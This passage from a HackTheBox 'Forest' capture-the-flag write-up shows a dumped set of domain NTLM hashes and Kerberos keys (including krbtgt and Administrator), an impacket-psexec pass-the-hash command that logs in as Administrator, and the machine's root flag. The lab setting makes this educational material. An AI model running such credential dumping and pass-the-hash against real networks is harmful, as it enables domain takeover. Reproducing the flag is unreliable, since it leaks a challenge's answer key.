htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
Dignitas:10101:aad3b435b51404eeaad3b435b51404ee:9075168608b7aba2428c8387bfeb9aee:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:43e6598bbcb24f8043b9285cc7d8c812:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
Dignitas:aes256-cts-hmac-sha1-96:27f7d0d9690c3353d2c5dd883a5d3b5f1e2d50a379f51d939974effb2fd8f356
Dignitas:aes128-cts-hmac-sha1-96:3403a6f63dc8b578ad76aa1f18f2b14d
Dignitas:des-cbc-md5:f4fe25f2510bc883
FOREST$:aes256-cts-hmac-sha1-96:a4fa6d7f67a0ffad420489ed900f775d5d4558508338bf66fc8188d243d27908
FOREST$:aes128-cts-hmac-sha1-96:ad327a26d6a1fb0b8d20a07abf55c84e
FOREST$:des-cbc-md5:670e46e5f1579d51
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up...
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739124666522/8af7f0f0-c5a8-4b7f-9ae7-c13f84f5db07.png align="center")

We now have the NTLM hash of the Administrator user let’s use the Pass-The-Hash attack to login into the system as Administrator.

```powershell
impacket-psexec 'administrator'@10.129.136.21 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739124873153/d3cbe5e1-b95f-409c-89f6-1fc79fe743fc.png align="center")

Now let’s get our root flag.

```bash
type root.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739124929420/219b464b-e96b-4e47-bc05-b5dfc7cd49ca.png align="center")

Flag: ***94a64d01f2fe488233eb7383bd1cb563***

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739125027674/b878e019-e5ad-4186-a42a-8fee7a867319.png align="center")